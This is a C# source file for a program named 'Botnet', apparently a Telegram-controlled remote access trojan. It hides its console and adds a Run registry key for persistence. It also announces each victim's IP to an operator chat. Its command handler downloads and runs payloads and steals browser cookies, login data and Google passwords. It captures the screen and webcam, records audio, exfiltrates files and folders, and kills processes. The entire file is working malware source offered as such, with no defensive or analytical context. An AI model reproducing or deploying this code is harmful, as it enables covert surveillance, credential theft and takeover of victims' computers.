using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using Telegram.Bot;

namespace Botnet
{
    class cMain
    {
        static TelegramSystem ts;
        static Misc misc;
        static MainFuncs mainFuncs;

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        const int SW_HIDE = 0;

        private static string[] commandList = { "/open_link", "/GetGPSLocation", "/download_execute", "/exit", "/ddos", "/GetCookieFile", "/GetSystem", "/GetProcess", "/KillProcess", "/ping","/ls", "/DownloadFile", "/DownloadFolder", "/CaptureMonitor", "/TakeScreenShot", "/SnapShotCam","/GetGooglePasswords", "/OpenFile", "/RecordAudio", "/MessageBox","/help"};

        private static ITelegramBotClient bot;
        public static bool Is64Bit()
        {
            return Marshal.SizeOf(typeof(IntPtr)) == 8;
        }

        static string IP = Misc.GetIp();

        static void Main(string[] args)
        {
            ts = new TelegramSystem(config.Token);
            misc = new Misc(ts);
            mainFuncs = new MainFuncs(ts, misc);
            ShowWindow(GetConsoleWindow(), SW_HIDE);
            Microsoft.Win32.RegistryKey Key =
            Microsoft.Win32.Registry.CurrentUser.OpenSubKey(
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", true);

            // добавляем первый параметр - название ключа
            // Второй параметр - это путь к
            // исполняемому файлу нашей программы.
            Key.SetValue(config.currProc, Directory.GetCurrentDirectory());         // "D:\\BotFiles\\TeleRat.exe"
            Key.Close();

            ts.SendMessage($"Bot [{Misc.GetIp()}] is online");
            bot = new TelegramBotClient(config.Token);
            bot.OnMessage += OnTelegramMessage;
            bot.StartReceiving();

            Console.ReadKey();
        }

        private static async void OnTelegramMessage(object sender, Telegram.Bot.Args.MessageEventArgs e)
        {
            if(e.Message.Chat.Id == long.Parse(config.Chat_ID))
            {
                if (e.Message.Document != null && e.Message.Caption.Contains("/UploadUpdate"))          // TODO: Сделать разархивирование и запуск файла. Сделать рабочий метод для использования комманды
                {
                    string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\BotFiles\\" + e.Message.Document.FileName;
                    Directory.CreateDirectory(path);
                    var file = await bot.GetFileAsync(e.Message.Document.FileId);

                    using (var saveFile = new FileStream(path + "\\" + e.Message.Document.FileName, FileMode.Create))
                    {
                        await bot.DownloadFileAsync(file.FilePath, saveFile);
                    }

                    Process.Start(path);
                }
                else if (e.Message.Document != null && e.Message.Caption == "/UploadExecute")
                {

                    string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\BotFiles\\";
                    Directory.CreateDirectory(path);
                    path += e.Message.Document.FileName;
                    var file = await bot.GetFileAsync(e.Message.Document.FileId);

                    using (var saveFile = new FileStream(path, FileMode.Create))
                    {
                        await bot.DownloadFileAsync(file.FilePath, saveFile);
                    }

                    try
                    {
                        Process.Start(path);
                    }
                    catch
                    {
                        ts.SendMessage($"[ERROR] [{Misc.GetIp()}] Something wrong");
                    }
                }
                else if (e.Message.Document != null)
                {
                    string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\BotFiles\\" + e.Message.Document.FileName;
                    Directory.CreateDirectory(path);
                    var file = await bot.GetFileAsync(e.Message.Document.FileId);

                    using (var saveFile = new FileStream(path + "\\" + e.Message.Document.FileName, FileMode.Create))
                    {
                        await bot.DownloadFileAsync(file.FilePath, saveFile);
                    }
                }
                else
                {
                    cmd command = new cmd(e.Message.Text);
                    Execute(command);
                }
            }
        }

        static void Execute(cmd CMD)
        {
            string text = string.Empty;
            if(File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "lastCMD.txt"))
            {
                StreamReader reader = new StreamReader(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "lastCMD.txt");
                text = reader.ReadToEnd();
                reader.Close();
            }
            else
            {
                StreamWriter Writer = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "lastCMD.txt");
                Writer.AutoFlush = true;
                Writer.Close();
            }
            if (text == CMD.ComType + "|" + CMD.ComContent)
            {

            }
            else
            {
                switch (CMD.ComType.ToLower())
                {
                    case "/open_link":
                        if (CMD.ComContent == null)
                            ts.SendMessage("Usage - /open_link|<link>  (without <>)");
                        else
                            mainFuncs.OpenLink(CMD.ComContent);
                        break;
                    case "/download_execute":
                        if (CMD.ComContent == null)
                            ts.SendMessage("Usage - /download_execute|<link>  (without <>)");
                        else
                            mainFuncs.DownloadExecute(CMD.ComContent);
                        break;
                    case "/exit":
                        Environment.Exit(0);
                        break;
                    case "/ddos":
                        break;
                    case "/getcookiefile":
                        mainFuncs.GetCookieAndLoginData();
                        break;
                    case "/getsystem":
                        mainFuncs.GetSystem();
                        break;
                    case "/getprocess":
                        mainFuncs.GetProcess();
                        break;
                    case "/getgpslocation":
                        mainFuncs.GetGPSLocation();
                        break;
                    case "/messagebox":
                        if (CMD.ComContent == null || CMD.ComThreads == null)
                            ts.SendMessage("Usage - /MessageBox|<message>|<caption>  (without <>)");
                        else
                            mainFuncs.ShowMessageBox(CMD.ComContent, CMD.ComThreads);
                        break;
                    case "/killprocess":
                        if (CMD.ComContent == null)
                            ts.SendMessage("Usage - /KillProcess|<process name>  (without <>)");
                        else
                            mainFuncs.KillProcess(CMD.ComContent);
                        break;
                    case "/ls":
                        if (CMD.ComContent == null)
                            mainFuncs.GetFiles(Directory.GetCurrentDirectory());
                        else
                            mainFuncs.GetFiles(CMD.ComContent);
                        break;
                    case "/downloadfile":
                        if (CMD.ComContent == null)
                            ts.SendMessage("Usage - /DownloadFile|<full path to file>  (without <>)");
                        else
                            mainFuncs.DownloadFile(CMD.ComContent);
                        break;
                    case "/snapshotcam":
                        mainFuncs.SnapShotCam();
                        break;
                    case "/capturemonitor":
                        if(CMD.ComContent == null)
                            ts.SendMessage("Usage - /capturemonitor|<video time>  (without <>)");
                        else
                        {
                            if (int.TryParse(CMD.ComContent, out int delay))
                                mainFuncs.CaptureScreen(delay);
                            else
                                ts.SendMessage("Write correct property!");
                        }
                        break;
                    case "/capturewebcam":                                  // TODO: Capture from Webcam
                        break;
                    case "/takescreenshot":
                        mainFuncs.TakeScreenShot();
                        break;
                    case "/getgooglepasswords":
                        mainFuncs.GetGooglePasswords();
                        break;
                    case "/ping":
                        ts.SendMessage($"[Ping] [] I'm up");
                        break;
                    case "/openfile":
                        if (CMD.ComContent == null)
                            ts.SendMessage("Usage - /OpenFile|<full path to file>  (without <>)");
                        else
                            Process.Start(CMD.ComContent);
                        break;
                    case "/downloadfolder":
                        if (CMD.ComContent == null)
                            ts.SendMessage("Usage - /DownloadFolder|<full path to folder>  (without <>)");
                        else
                            mainFuncs.DownloadFolder(CMD.ComContent);
                        break;
                    case "/help":
                        mainFuncs.SendCommands();
                        break;
                    case "/recordaudio":
                        if (CMD.ComContent != null)
                            funcs.RecordAudio(CMD.ComContent);
                        else
                            funcs.RecordAudio();
                        break;
                    default:
                        int i = 1;
                        foreach (var command in commandList)
                        {
                            if (CMD.ComType.Contains(command))
                                i = 0;
                        }
                        if (i != 0)
                            mainFuncs.SendCommands();
                        break;
                }
                StreamWriter Writer = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "lastCMD.txt");
                Writer.AutoFlush = true;
                Writer.Write(CMD.ComType + "|" + CMD.ComContent);
                Writer.Close();
            }
        }
    }
}
